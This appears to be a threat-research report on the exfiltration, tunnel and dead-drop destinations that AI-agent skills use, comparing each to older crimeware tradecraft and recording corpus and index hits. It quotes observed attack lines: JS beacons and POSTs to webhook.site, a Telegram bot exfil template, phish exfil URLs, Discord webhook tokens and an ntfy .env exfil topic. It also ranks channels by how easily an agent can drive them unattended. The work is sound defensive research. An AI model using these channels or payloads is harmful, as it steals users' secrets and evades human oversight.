# WHY THESE SITES — selection logic, historical tradecraft, and link-hunt

**Date:** 2026-10-05. **Coordinator:** WHY-SITES.
**Thesis under test (BigSexyWarlock69):** the egress destinations in our skill scans are "11 y/o tradecraft — not new."
**Source URL set:** `studies/skill-egress-top500/EGRESS_MAP.md` top-10 + full destination inventory extracted from `raw/scan-{a,b,c}.json` hit matches (webhook/relay/img_upload/tunnel/paste/email/dns/creds categories). The parallel SCAN-1000 expansion had not landed its EGRESS_MAP.md at write time — its new URLs fold into a v2 of this report.
**Workers:** HISTORIAN (historical mapping), CORPUS-GREPPER (local corpora), INDEX-HUNTER (public indexes). Worker files under `workers/<name>/FINDINGS.md`; raw index data under `workers/index-hunter/urlscan/` + `shodan-counts-raw.txt`.
**Method note:** selection-logic properties below are from public documentation (no probing). Grades: CONFIRMED-OLD / PARTIALLY-NEW / ACTUALLY-NEW (historian's scale). OBSERVED vs INFERENCE separated throughout.

---

## Bottom line

**The thesis is right about the exfil primitives and wrong about the interfaces.** 10 of 14 destinations grade CONFIRMED-OLD with real citations — some are literally the same product lineage (RequestBin 2012 → Pipedream 2019). Agents converge on these sites for the same invariant reasons crimeware did a decade ago: **no human in the loop at use time, keyless-or-preprovisioned credentials, simple HTTP, and trusted origin where filtering matters.** The constraints haven't changed; only the caller has.

The carve-outs are all in the **agent-invokable control plane**: Bitwarden-via-MCP is ACTUALLY-NEW (an agent *invoking* a credential vault through an authorized tool protocol — the preconditions didn't exist before MCP, Nov 2024); eSIM-via-crypto and LocalCan are PARTIALLY-NEW (atom-to-bit identity acquisition; tunnel brokers shipping first-party MCP servers "for AI agents"). **The destinations are old. The control planes are the new attack surface.**

---

## 1. Selection logic — the property table

Why does an agent (or a skill author writing for an agent) pick *this* site? Scored from public documentation. The pattern that repeats: the human, if one is needed at all, is amortized at setup — **at use time there is never a human in the loop.**

| Destination | Keyless at use | No signup | No CAPTCHA | No human at use | Trusted origin | Free tier | Simple HTTP API | Anonymous upload | What the agent gets |
|---|---|---|---|---|---|---|---|---|---|
| ngrok | token after signup | no | yes | yes | mixed | yes | CLI+API | n/a (tunnel) | public URL → localhost |
| cloudflared quick tunnels | **yes** | **yes** | yes | yes | cloudflare.com | yes | one command | n/a | public URL → localhost, no account |
| bore.pub | **yes** | **yes** | yes | yes | no | yes | one command | n/a | public URL → localhost, no account |
| r.jina.ai | **yes** (was) | **yes** | yes | yes | neutral | yes | URL prefix | n/a (proxy) | JS-free markdown of any page |
| Discord webhooks | **yes** (bearer URL) | setup once | yes | yes | **discord.com** | yes | POST JSON | n/a | dead drop on a trusted domain |
| Slack webhooks | **yes** (bearer URL) | setup once | yes | yes | **hooks.slack.com** | yes | POST JSON | n/a | dead drop on a trusted domain |
| webhook.site | **yes** | **yes** | yes | yes | no | yes | instant UUID inbox | n/a | disposable HTTP sink, zero setup |
| pipedream.net | requestbin URLs | email signup | yes | yes | m.pipedream.net | yes | instant endpoint | n/a | RequestBin lineage, workflowable sink |
| uploads.github.com | token (setup once) | setup once | yes | yes | **github.com** | yes | REST upload | n/a | file host nobody can block |
| user-attachments / user-images | token (setup once) | setup once | yes | yes | **github.com** | yes | upload flow | n/a | same, via issue/PR pipeline |
| catbox.moe | **yes** | **yes** | yes | yes | no | yes | POST file | **yes** | permanent file, no account |
| litterbox (litter.catbox.moe) | **yes** | **yes** | yes | yes | no | yes | POST file | **yes** | temp file, no account |
| httpbin.org / httpbun | **yes** | **yes** | yes | yes | no | yes | GET/POST echo | n/a | connectivity oracle + echo target |
| ghostbin | **yes** | **yes** | yes | yes | no | yes | POST paste | **yes** | text dead drop |
| ntfy.sh | **yes** | **yes** | yes | yes | no | yes | PUT/GET topic | **yes** | pub/sub dead drop, polling C2 |
| api.telegram.org/bot | token (setup once) | setup once | yes | yes | telegram.org | yes | Bot API | n/a | C2 that looks like chat traffic |
| email (SMTP/JMAP) | creds (setup once) | setup once | yes | yes | sender domain | yes | SMTP | n/a | exfil + C2 over mail protocols |
| sci-hub.se | **yes** | **yes** | yes | yes | no | yes | GET PDF | n/a | paywall bypass, hostile endpoint |
| anon.li | PoW | **yes** | yes | yes | no | yes | MCP | **yes** | self-service agent email |
| uploadthing / vercel-blob | API key (setup once) | setup once | yes | yes | vercel.app | yes | SDK upload | no | commercial blob dead drop |
| Bitwarden via MCP | vault unlock (setup) | setup once | yes | yes | local | yes | MCP tools | n/a | **credential vault as callable tools** |
| LocalCan | local binary | buy/setup | yes | yes | local | paid | **MCP server** | n/a | tunnel broker with agent control plane |
| Roamzy eSIM | crypto (no KYC) | **yes** | yes | yes | no | paid | MCP | **yes** | anonymous mobile identity, bit-only |

**INFERENCE — the invariant.** Every destination satisfies the same constraint set, and it is the same set crimeware optimized for in 2010–2015: (1) usable with no human present at operation time; (2) authentication is either absent or a bearer string that can be pasted into code; (3) plain HTTP(S) with no exotic protocol; (4) where network filtering exists, a trusted origin to hide behind. An agent is just a stricter optimizer of these constraints than a human operator — it cannot click a CAPTCHA, cannot receive an SMS, cannot do KYC. **The sites that survive are the ones a headless loop can drive.** That is why the list looks like a 2014 RAT operator's bookmarks: the selection pressure never changed.

---

## 2. Per-destination: why this site, historical analogue, thesis grade

(HISTORIAN's full citations in `workers/historian/FINDINGS.md`; condensed here.)

| # | Destination | Why this site (selection logic) | Pre-2015 analogue (cited) | Same vs new | Grade |
|---|---|---|---|---|---|
| 1 | Discord/Slack webhooks | bearer URL = no account, no infra; POST JSON; blends into chat traffic | IRC C2 — Agobot 2002–04 (ZDNet; Symantec); Pastebin dead drops 2002→2013–15 (Sinegubko/Sucuri Jan 2015; RSA Fielder Apr 2013) | Same tradecraft, better ergonomics. Platform-specific exfil only ~2019–20 (Netskope TroubleGrabber) — noted honestly | **CONFIRMED-OLD** |
| 2 | catbox.moe / litterbox | keyless, no-signup, anonymous upload, simple POST | Public-image dead drops — FBI Illegals Program complaint Jun 2010 (practice dated 2005); ImageShack/TinyPic era 2003–04 | Same class. Honest gap: no named malware family found on ImageShack specifically | **CONFIRMED-OLD*** |
| 3 | ngrok / cloudflared / bore | inside machine dials out; NAT/firewall never in play; quick tunnels need no account | netcat `-e`, released Oct 28 1995 (Hobbit); ngrok abuse by NjRAT/DarkComet/Vultur documented from 2013 | Identical mechanism for 30 years; hosted TLS-native re-skin of `nc -e` | **CONFIRMED-OLD** |
| 4 | uploads.github.com | file host on a domain nobody can afford to block | Translate-as-proxy 2005 (gHacks); domain fronting formalized 2014–15 (meek, PETS 2015) | Goal ancient; attachment-pipeline-as-CDN specialization is newer | **PARTIALLY-NEW** |
| 5 | sci-hub.se + verify=False | paywall bypass for literature agents; hostile endpoint forces cert verification off | Sci-Hub launched Sep 5 2011; warez-era piracy-infra repurposing | Same as a grad student with a mirror list in 2012; verify=False is the operational tell, not new tradecraft | **CONFIRMED-OLD** |
| 6 | email send | steal → encrypt → mail to throwaway; signed by the sender's own DKIM | HawkEye/Predator Pain SMTP exfil 2013–14 (Trend Micro); MITRE T1071.003 | Keylogger-101, commercial keylogger era | **CONFIRMED-OLD** |
| 7 | r.jina.ai | origin IP never touches target; content laundered under proxy domain; markdown tuned for LLM consumption | Google Translate as proxy, Dec 2005 (gHacks); Symantec Aug 2009 on Translate abuse; open-proxy economy 2000s | Fetch-by-proxy is 20 years old; markdown-for-LLMs is a purpose refinement, not a new mechanism | **CONFIRMED-OLD** |
| 8 | webhook.site / pipedream | disposable sink URL; zero setup; inspect inbound HTTP | **RequestBin 2012 (Kenneth Reitz) — same product lineage** (Pipedream relaunched it 2019) | Byte-for-byte what a developer did in 2013 debugging a Stripe callback | **CONFIRMED-OLD** |
| 9 | httpbin.org / httpbun | connectivity oracle, echo target, payload carrier | httpbin.org announced Jun 2011 (Reitz; examples dated Jun 13 2011) | Dev-test scaffolding repurposed — 15 years | **CONFIRMED-OLD** |
| 10 | ghostbin | anonymous text dead drop | Pastebin family 2002–2015 (see #1) | A pastebin clone is a pastebin for tradecraft purposes | **CONFIRMED-OLD** |
| 11 | api.telegram.org/bot | C2 that looks like chat traffic to a network admin | Chat-C2 family 2002 (Agobot); Telegram Bot API Jun 2015; first malware Dec 2016 (ESET TeleBots) / Nov 2016 (Kaspersky Telecrypt) | Youngest of the old set — right at the 11-year edge, stated plainly | **CONFIRMED-OLD** |
| 12 | Bitwarden via MCP | secrets as callable tools, vault mediates access/scope | **None.** "Steal the vault" is ancient; *invoking* a vault through an authorized agent tool protocol has no pre-2015 analogue — the preconditions (agents, MCP Nov 2024) didn't exist | Credential consumed in-tool inside the agent loop, never transiting as exfil | **ACTUALLY-NEW** |
| 13 | eSIM via crypto | anonymous telecom identity, no atoms moved | Burner-phone goal ancient; eSIM GSMA specs ~2016 | Goal old; bit-only acquisition loop (crypto checkout → remote profile provisioning, agent-executable) has no pre-2015 equivalent | **PARTIALLY-NEW** |
| 14 | LocalCan | tunnel broker with first-party MCP server "for AI agents" | Tunnel primitive §3 (1995/2013) | Pivot old; agent-native control plane new — same pattern as #12 | **PARTIALLY-NEW** |

**Scoreboard: 10 CONFIRMED-OLD · 3 PARTIALLY-NEW · 1 ACTUALLY-NEW.**

---

## 3. Link-hunt — signs found per URL

### 3a. In our incident corpora (CORPUS-GREPPER; full table in `workers/corpus-grepper/FINDINGS.md`)

12,836 files grepped across silent-locus, the urlquery hunt dataset, and skill-tracer (study's own raw/ and egress-live-scan/ excluded). OBSERVED highlights:

- **r.jina.ai — 464 files / 34,471 line-matches.** Relay URLs throughout incident events: `r.jina.ai/https://www.sec.gov/files/county.json`, `r.jina.ai/http://vanderbi.lt/maallraw260618`. The corpus's relay/laundering layer, not just tooling docs.
- **httpbin.org — 264 / 40,422. httpbun.com — 122 / 3,226.** AIHW/Tableau campaign submissions embed `httpbun.com/base64/<payload>` pages whose decoded JS fires beacons (`new Image().src='https://httpbun.com/status/204?...'`) and exfil POSTs (`fetch('https://webhook.site/644af2ca-bfce-4061-87b8-2603bcb3156?m=LONG1782010065',...)`). A mail-credential variant POSTs harvested creds to api.mail.tm.
- **webhook.site — 318 / 2,269.** UUID dead drops incl. an OTP-phish exfil: `webhook.site/15c90e66-…/undefined?otp=478536&emailId=…`.
- **Discord webhooks with full tokens** in the evaluator corpus (`personas/evaluator/raw/phase1_results.json`): ~~CORRECTED 2026-10-05 (LINKHUNT-DEEP §0.4, §2):~~ **six** `discord.com/api/webhooks/<id>/<token>` records, not three. The file is the evaluator persona's scoredrop-lane URL inventory (hunt for escaped eval runs reporting scores via dead-drop inboxes) — its 12 keys are urlquery htmx *search terms* (6 dead-drop domains + 6 eval keywords: `accuracy`, `pass@1`, `exact_match`, `task_complete`, `swe-bench`, `scoreboard`), **not benchmark output**. Five records (A–D, F; reports 2025-05-31 → 2026-09-03) are bare-URL read probes — urlquery sandbox issued read-only GETs; record A captured `GET → 404` at scan time (token already dead or never valid). One (E, 2025-09-10: `43.226.1.26:5000/get_soundhttps:/discord.com/api/webhooks/1404099194175619203/FktBiiN76dGTrk`, OVH IP, Quad9 verdict malicious/sinkholed, 14-char truncated token fragment) is **crimeware-shaped, not agent-shaped**. No eval-run connection; no score payloads; tokens were never validated or used.
- **pipedream.net — 26 / 167.** Live requestbin endpoints on urlquery: `eo6p96x7ax0vcaj.m.pipedream.net/Oneotsuka` (report 6994a063, 2026-09-03) and three more back to 2026-05.
- **api.telegram.org — 25 / 42.** Bot exfil templates in phish-kit submissions: `api.telegram.org/bot${8935051385:<TOKEN>}/sendMessage?chat_id=&text=<HOST INFO>`.
- **trycloudflare.com — 25 / 66.** ~~RETRACTED 2026-10-05 (LINKHUNT-DEEP §0.1):~~ the "DeepSearchQA fingerprint" on `morris-satellite-deferred-letters.trycloudflare.com/apps/who-visits/?i=316697` was a **false positive** — the WHO acronym (World Health Organization, from DSQA question text) collided case-insensitively with the English word "who" in the path segment "who-visits". Deep-trace of urlquery record `ec2fdfcd-e213-4d39-8ed3-fcf4adf457f0` shows a **Facebook credential-phish kit** behind a cloudflared quick tunnel (urlquery tags `meta`/`facebook`/`phishing`/`social`; Cloudflare flagged the tunnel domain Sep 26 — HTTP 403 since). Crimeware, not agent infrastructure; `?i=316697` matches no DSQA qid. **The fingerprint claim is withdrawn** (recommendation: word-boundary/minimum-token rule for short-acronym fingerprints).
- **ngrok.io — 103 / 2,176.** ~~CORRECTED 2026-10-05 (LINKHUNT-DEEP §0.3):~~ the `oai-`-prefixed tunnel (`oai-scratchpad-cache-versioning-demo.ngrok.io`) is **the investigator's own demo infrastructure** — joshuadavid's wikiagentswarminvestigation demo-scratchpad (a "Demo Messageboard" proving OpenAI web.run page-cache versioning), shallow-cloned into our tree 2026-10-05. The `oai-` prefix is investigator naming, not incident attribution; it is the only `oai-`-prefixed tunnel hostname in all corpora. Retained as a reference artifact for the cache-pinning mechanism, not a campaign lead.
- **catbox.moe / litter.catbox.moe, ntfy** (topic polls: `friendlyAgents`, `grp528fa63`) — corroborated.
- **Study-internal only** (no corpus corroboration): hooks.slack.com, ghostbin, gmail.googleapis.com, sci-hub.se, localcan, roamzy.
- **Zero hits:** cfargotunnel.com, uploadthing, vercel-blob.
- **False positives:** `bore` matched only boredapi.com / arquivo.pt "colabore" — no bore.pub tunnel in corpora.

### 3b. In public indexes (INDEX-HUNTER; raw data in `workers/index-hunter/urlscan/` + `shodan-counts-raw.txt`)

- **AGENT-SHAPED (4):** r.jina.ai (incident writeups name it an LLM-agent relay rung — Transluce Sep-23; RubyGems doc-worker attribution: "strongest technical signal"; public SKILL.md files instruct keyless fallback); **uploads.github.com** (Shai-Hulud-class exfil channel + TeamPCP release-asset exfil fallback; urlscan total 0 — consistent with API-driven, non-rendered exfil); **ntfy.sh** (Feb 2026 OpenClaw marketplace trojan exfiltrated base64 .env files via `ntfy.sh/sysheartbeat-local-9`); **bore.pub** (ClawHavoc campaign signature IOC — persistent tunnel on port 6668 exposing `/kapubot` + `/deploy.zip`, scanned repeatedly Sep 20–23).
- **MIXED / agent-adjacent:** localhost.run (phishing in the wild, but documented agent-skill usage); ghostbin (commodity malware staging, listed in agent-skill scanners); localcan.dev (ships MCP server for agents, no abuse found); roamzy.io (agent-native eSIM product, no abuse); sci-hub.se (agent research skills use it, benign).
- **CRIMEWARE-GENERIC (9):** ngrok.io, ngrok-free.app, trycloudflare.com, discord.com, hooks.slack.com, webhook.site, catbox.moe, litter.catbox.moe, api.telegram.org — documented abuse is commodity phishing/RAT/infostealer (NjRAT, Vultur, Lumma, TroubleGrabber, BlueDelta/APT28 on webhook.site), no agent link.
- **NO SIGNAL:** anon.li, uploadthing.com.
- **Live lead (INFERENCE — not evidence of agent usage):** ~~REFRAMED 2026-10-05 (LINKHUNT-DEEP §0.2, §1):~~ urlscan shows `eo3wuo9z334anlh.m.pipedream.net` scanned 9× on 2026-10-05 against `/ssh_` — but the repetition is **observer-side**: 7 submissions came through the urlscan API in three scripted bursts (10:03–10:06, 10:52–10:54, 11:02/11:23 UTC) and 2 were urlhaus auto-submissions. This evidences *watching*, not operator beaconing. The endpoint itself is live but answered **HTTP 400** to the scans (validating dead drop — expects a specific POST shape); `/ssh_` is an odd operator-tag-like path; pipedream.net is already in the corpus's dead-drop grammar. **Watchlist-grade, not evidence-grade.** Suggested follow-up: passive 7-day re-scan (not executed); submitter identity still unknown.

**INFERENCE — what the link-hunt says about the thesis.** The corroboration pattern is itself old-shaped: the domains most corroborated in incident corpora (jina, httpbun, webhook.site, pipedream, telegram) are exactly the CONFIRMED-OLD set. The ACTUALLY-NEW / PARTIALLY-NEW items (Bitwarden, eSIM, LocalCan, uploadthing) have near-zero corpus or index footprint — they are too new to have incident history yet, which is precisely why they deserve the tripwires.

---

## 4. Bottom line for BigSexyWarlock69

**You're right about the tradecraft.** The egress destination list is a 2014 RAT operator's bookmarks with fresh paint — 10 of 14 with real citations, some literally the same product (RequestBin→Pipedream). The reason agents pick these sites is the reason everyone picks them: they're the sites a headless loop can drive. No CAPTCHA, no human, no KYC, bearer-string auth, plain HTTP, trusted origin where it counts. The selection pressure is invariant; the caller changed.

**Where the thesis needs the carve-out:** the agent-interface layer. Bitwarden-via-MCP isn't "credential theft" — it's *delegated credential access through a machine interface built for agents*, and nothing like it existed before MCP. eSIM-via-crypto moves identity acquisition from atoms to bits. Tunnel brokers now ship MCP servers so agents self-provision ingress. **Watch the control planes, not just the destinations.**

**If the tradecraft is old, the old countermeasures should work** — and mostly they do, which is the practical payoff of the thesis:
1. **Dead-drop monitoring (works):** webhook.site/pipedream UUID patterns, Discord-webhook-URL entropy scanning in code (gitleaks-style — the evaluator corpus already holds full tokens), ntfy topic enumeration. The 2013 answer to RequestBin abuse was watching the bins; it still is.
2. **Tunnel detection (works):** CT-log wildcard monitoring (`*.ngrok.io`, `*.trycloudflare.com` — recon logged 5,000 trycloudflare rows at the crt.sh cap), Aigis-style tunnel-URL output filters (already shipping as `out_tunnel_relay_url`).
3. **Trusted-origin abuse (partially works):** CSP and domain allowlists cannot save you — github.com and discord.com are *supposed* to be allowed. Monitor the upload APIs and webhook-creation events, not the domains.
4. **Proxy laundering (works):** egress blocklists for reader proxies — wigolo already does this; it's the first observed counter-pattern and it should be copied.
5. **For the new stuff (no old countermeasure exists):** audit MCP servers as privileged attack surface (what tools can the agent invoke?); scope vault access per-task, never whole-vault; treat eSIM/crypto-identity purchase as sybil-infrastructure provisioning and tripwire it.

**What would change this assessment:** SCAN-1000's EGRESS_MAP.md (pending — fold in on arrival); a 7-day passive re-scan of the `eo3wuo9z334anlh.m.pipedream.net/ssh_` lead; any incident-corpus sighting of Bitwarden-via-MCP or eSIM-via-crypto in the wild (currently zero — that absence is itself the tripwire).

---
*Worker reports: `workers/historian/FINDINGS.md` (267 lines, 14 destinations, full source list) · `workers/corpus-grepper/FINDINGS.md` (per-domain table, 15 notable-hit citations) · `workers/index-hunter/FINDINGS.md` (21 domains, Shodan counts + urlscan JSONs + snippets). Evidence rule held: full observed values, never redacted; OBSERVED/INFERENCE separated.*
